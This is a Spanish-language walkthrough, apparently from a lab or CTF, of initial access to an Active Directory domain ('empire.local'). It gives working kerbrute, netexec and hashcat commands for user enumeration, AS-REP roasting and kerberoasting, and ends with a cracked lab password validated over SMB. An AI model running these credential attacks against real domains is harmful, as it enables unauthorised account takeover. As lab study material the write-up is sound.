---
title: "2- Acceso Inicial"
---



Vamos a comprobar si el usuario encontrado es válido a nivel de dominio

# Enumeración de usuarios con Kerbrute

Podríamos usar enormes listas de usuarios con `kerbrute/ldapnomnom` para ver si encontramos más usuarios, pero de momento pasamos.

Primero añadimos los DCs al archivo host:

```bash
netexec smb scope.txt --generate-hosts-file hosts.txt
```

Miramos a ver si existen los usuarios:

```bash
./kerbrute userenum --dc 192.168.56.5 -d empire.local users.txt 
```

# AS-REP ROASTING

Probamos un AS-REP ROASTING

```bash
nxc ldap empire.local -u users.txt -p '' --asreproast asreproast.txt
```

```bash
hashcat asreproast.txt --wordlist tools/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

```bash
hashcat asreproast.txt --wordlist tools/SecLists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

Probamos wordlist para kerberoasting

```bash
wget https://gist.github.com/The-Viper-One/a1ee60d8b3607807cc387d794e809f0b/raw/b7d83af6a8bbb43013e04f78328687d19d0cf9a7/kerberoast_pws.xz
```

```bash
hashcat ../asreproast.txt --wordlist kerberoast_pws -r /usr/share/hashcat/rules/best64.rule
```

# Kerberoasting

Como no conseguimos sacar la contraseña, podemos aprovechar que el usuario es as rep roasteable para probar un kerberoasting contra otros usuarios:

```bash
nxc ldap 10.0.0.5 -u grievousssssss -p '' --no-preauth-targets nla_users.txt --kerberoasting output.txt
```

```bash
nxc ldap 192.168.56.5 -u grievoussssss -p '' --no-preauth-targets users.txt --kerberoasting kerberoast.txt
```

```bash
hashcat kerberoast.txt --wordlist tools/kerberoast_pw
```

```
liu8Sith
```

```bash
nxc smb empire.local -u 'krennic' -p 'liu8Sith'
```
